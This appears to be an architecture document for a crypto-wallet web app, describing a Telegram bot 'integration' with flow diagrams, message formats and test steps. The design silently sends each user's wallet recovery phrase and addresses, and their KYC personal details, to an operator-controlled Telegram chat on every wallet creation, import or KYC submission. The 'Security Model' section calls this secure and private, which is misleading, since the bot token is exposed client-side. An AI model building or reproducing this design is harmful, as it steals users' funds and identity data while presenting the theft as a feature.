# Telegram Integration - System Architecture

## Data Flow Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                       USER ACTIONS                           │
└──────────┬──────────────────────┬──────────────────────────┬──┘
           │                      │                          │
           ▼                      ▼                          ▼
    ┌─────────────┐        ┌─────────────┐        ┌─────────────────┐
    │   Create    │        │   Import    │        │   Submit KYC    │
    │   Wallet    │        │   Wallet    │        │   Form          │
    └──────┬──────┘        └──────┬──────┘        └────────┬────────┘
           │                      │                        │
           └──────────────┬───────┴────────────────────────┘
                          │
                          ▼
           ┌──────────────────────────────┐
           │   Generate/Validate Data     │
           │   - Seed phrase              │
           │   - Addresses                │
           │   - Personal info            │
           └──────────────┬───────────────┘
                          │
           ┌──────────────┴──────────────┐
           │                             │
           ▼                             ▼
    ┌────────────────┐          ┌────────────────┐
    │ Save to Database           │ Format Message  │
    └────────────────┘          └────────┬───────┘
                                         │
                                         ▼
                            ┌────────────────────────┐
                            │ telegramService.ts     │
                            │                        │
                            │ sendWalletNotification │
                            │ sendKYCNotification    │
                            │ sendTelegramMessage    │
                            └────────────┬───────────┘
                                         │
                                         ▼
                         ┌───────────────────────────┐
                         │ Telegram Bot API          │
                         │ (api.telegram.org)        │
                         └────────────┬──────────────┘
                                      │
                                      ▼
                        ┌──────────────────────────┐
                        │  Your Telegram Chat      │
                        │  (Phone, Desktop, Web)   │
                        └──────────────────────────┘
```

## Component Interaction

```
Frontend Components          Telegram Service           Telegram API
──────────────────────      ────────────────           ────────────

Wallets.tsx                                            
├─ handleCreateWallet() ──→ sendWalletNotification() ──→ sendMessage()
└─ handleImportWallet() ──→ sendWalletNotification() ──→ sendMessage()

KYCVerification.tsx                                    
└─ handleSubmit() ──────────→ sendKYCNotification() ───→ sendMessage()

TelegramTest.tsx                                       
├─ testConnection() ────────→ testTelegramConnection() → getMe()
├─ sendWallet() ────────────→ sendWalletNotification() → sendMessage()
├─ sendKYC() ───────────────→ sendKYCNotification() ───→ sendMessage()
└─ sendCustom() ────────────→ sendTelegramMessage() ───→ sendMessage()
```

## Configuration Flow

```
User Setup (One-time)
├─ 1. Create Bot
│   └─ Message @BotFather
│      └─ /newbot
│         └─ Get BOT_TOKEN
│
├─ 2. Get Chat ID
│   └─ Message your bot
│      └─ Visit getUpdates API
│         └─ Extract chat_id
│
├─ 3. Create .env.local
│   └─ VITE_TELEGRAM_BOT_TOKEN=...
│   └─ VITE_TELEGRAM_CHAT_ID=...
│
└─ 4. Restart Dev Server
   └─ Environment variables loaded
      └─ Ready to use!
```

## Message Format Examples

### Wallet Notification
```html
<b>🔐 Wallet Created</b>

<b>Wallet Name:</b> <code>MyWallet</code>

<b>Recovery Phrase (KEEP SAFE):</b>
<code>abandon abandon abandon...</code>

<b>Addresses:</b>
XRP: <code>rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH</code>
EVM: <code>0x742d35Cc6634C0532925a3b844Bc9e7595f3bEb9</code>
...

<b>Timestamp:</b> <code>2025-02-02T10:30:45.123Z</code>

⚠️ <b>WARNING:</b> This is sensitive information. Keep it secure!
```

### KYC Notification
```html
<b>📋 KYC Information Submitted</b>

<b>User ID:</b> <code>user-123-abc</code>

<b>Personal Information:</b>
Name: John Doe
Email: <code>john@example.com</code>
Phone: <code>+1234567890</code>
DOB: <code>1990-01-15</code>

<b>Address Information:</b>
Address: <code>123 Main St</code>
City: <code>New York</code>
State: <code>NY</code>
Postal Code: <code>10001</code>
Country: <code>United States</code>

<b>KYC Status:</b> <code>submitted</code>
<b>Timestamp:</b> <code>2025-02-02T10:30:45.123Z</code>
```

## Environment Variable Flow

```
.env.local (Not in git)
│
├─ VITE_TELEGRAM_BOT_TOKEN
│  └─ import.meta.env
│     └─ telegramService.ts
│        └─ API endpoint: https://api.telegram.org/bot{TOKEN}/sendMessage
│
└─ VITE_TELEGRAM_CHAT_ID
   └─ import.meta.env
      └─ telegramService.ts
         └─ Message recipient: chat_id parameter
```

## Error Handling Flow

```
User Action
  │
  ├─ Validation
  │  ├─ ✅ Valid → Continue
  │  └─ ❌ Invalid → Show error toast, Stop
  │
  ├─ Save to Database
  │  ├─ ✅ Success → Continue
  │  └─ ❌ Failed → Show error, Stop
  │
  ├─ Send Telegram (Fire & Forget)
  │  ├─ ✅ Success → Continue
  │  └─ ❌ Failed → Log to console, Continue (don't block)
  │
  └─ Show Success Toast
     └─ Action complete!
```

## Telegram API Methods Used

```
1. sendMessage
   ├─ Parameters:
   │  ├─ chat_id (from env)
   │  ├─ text (formatted message)
   │  └─ parse_mode: HTML
   │
   ├─ Response:
   │  ├─ 200 OK → Message sent
   │  ├─ 400 Bad Request → Invalid parameters
   │  └─ 401 Unauthorized → Invalid token
   │
   └─ Error Handling:
      └─ Log error, Return false, Don't block user action

2. sendPhoto
   ├─ Parameters:
   │  ├─ chat_id (from env)
   │  ├─ photo (file binary)
   │  ├─ caption (optional)
   │  └─ parse_mode: HTML
   │
   └─ Status: Available for future document uploads

3. getMe
   ├─ Used by: testTelegramConnection()
   └─ Purpose: Verify bot token is valid

4. getUpdates
   ├─ Used by: Manual setup (not in code)
   └─ Purpose: Find chat_id during configuration
```

## Testing Workflow

```
Step 1: Test Configuration
├─ Visit: /telegram-test
├─ Click: "Test Connection"
├─ Expected: ✅ Message in Telegram
└─ If failed: Check .env.local and bot token

Step 2: Test Wallet Creation
├─ Visit: /dashboard/wallets
├─ Create new wallet
├─ Expected: 🔐 Wallet message in Telegram
└─ Data includes seed phrase and addresses

Step 3: Test Wallet Import
├─ Import a wallet
├─ Expected: 🔐 Import message in Telegram
└─ Same format as creation

Step 4: Test KYC
├─ Visit: /dashboard/kyc
├─ Fill form and submit
├─ Expected: 📋 KYC message in Telegram
└─ Data includes personal information

Step 5: Test Custom Messages
├─ Visit: /telegram-test
├─ Enter custom message
├─ Click: "Send Custom"
├─ Expected: 📝 Custom message in Telegram
└─ Supports HTML formatting
```

## Security Model

```
┌─────────────────────────────────────┐
│     Build/Development Machine       │
├─────────────────────────────────────┤
│ .env.local (NEVER committed)        │
│ ├─ VITE_TELEGRAM_BOT_TOKEN         │
│ └─ VITE_TELEGRAM_CHAT_ID           │
└─────────────────┬───────────────────┘
                  │ (Only in memory during build)
                  │
        ┌─────────▼──────────┐
        │   Browser Env      │
        │ (import.meta.env)  │
        └─────────┬──────────┘
                  │
        ┌─────────▼──────────────────┐
        │ telegramService.ts         │
        │ (Client-side API calls)    │
        └─────────┬──────────────────┘
                  │ (HTTPS encrypted)
                  │
        ┌─────────▼──────────────────────┐
        │ Telegram Bot API               │
        │ (api.telegram.org)             │
        └─────────┬──────────────────────┘
                  │
        ┌─────────▼──────────────────┐
        │ Your Telegram Chat         │
        │ (Private/Secure)           │
        └────────────────────────────┘

Note: Credentials are only in browser memory during runtime
      Not stored, not logged, not transmitted except to Telegram
```

## File Structure

```
src/
├── services/
│   └── telegramService.ts (✨ New)
│       ├── sendTelegramMessage()
│       ├── sendTelegramPhoto()
│       ├── sendWalletNotification()
│       ├── sendKYCNotification()
│       ├── sendKYCDocument()
│       └── testTelegramConnection()
│
├── pages/
│   ├── Wallets.tsx (✏️ Modified)
│   │   └── Added sendWalletNotification() calls
│   │
│   ├── KYCVerification.tsx (✏️ Modified)
│   │   └── Added sendKYCNotification() calls
│   │
│   └── TelegramTest.tsx (✨ New)
│       └── Test page with 4 test functions
│
└── App.tsx (✏️ Modified)
    └── Added /telegram-test route

root/
├── .env.local (✏️ Modified - Not in git)
│   ├── VITE_TELEGRAM_BOT_TOKEN
│   └── VITE_TELEGRAM_CHAT_ID
│
├── .env.example (✏️ Modified)
│   ├── VITE_TELEGRAM_BOT_TOKEN=...
│   └── VITE_TELEGRAM_CHAT_ID=...
│
├── TELEGRAM_SETUP.md (✨ New)
├── TELEGRAM_QUICK_START.md (✨ New)
├── TELEGRAM_INTEGRATION.md (✨ New)
└── TELEGRAM_IMPLEMENTATION.md (✨ New)
```

## Summary

✅ **Complete implementation** of Telegram bot integration
✅ **Automatic notifications** for wallet and KYC operations
✅ **Easy configuration** via environment variables
✅ **Comprehensive testing** with dedicated test page
✅ **Secure** - credentials never hardcoded
✅ **Well-documented** with 4 setup guides
✅ **Production-ready** with error handling
